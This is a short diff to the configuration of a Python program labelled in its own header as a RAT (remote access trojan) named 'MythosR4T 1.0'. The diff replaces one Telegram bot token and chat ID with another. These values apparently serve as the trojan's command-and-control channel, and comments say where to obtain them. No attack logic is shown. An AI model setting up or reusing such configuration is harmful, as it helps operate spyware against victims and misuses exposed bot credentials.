@@ -6,5 +6,5 @@
 # Main Language : Python
 # Version RAT   : MythosR4T 1.0
 
-TOKEN = "5594316492:AAFk8FnR5Ra1Y1f5JyBKy_D7fL3VEv-FM_k" # GET TOKEN --> tme.to/BotFather
-ID = "1543290559" # GET ID --> tme.to/my_id_bot
+TOKEN = "8463407409:AAEKLX5N6XA9sQxqeK6CHEHun28aDMbNfF4" # GET TOKEN --> tme.to/BotFather
+ID = "8337644143" # GET ID --> tme.to/my_id_bot
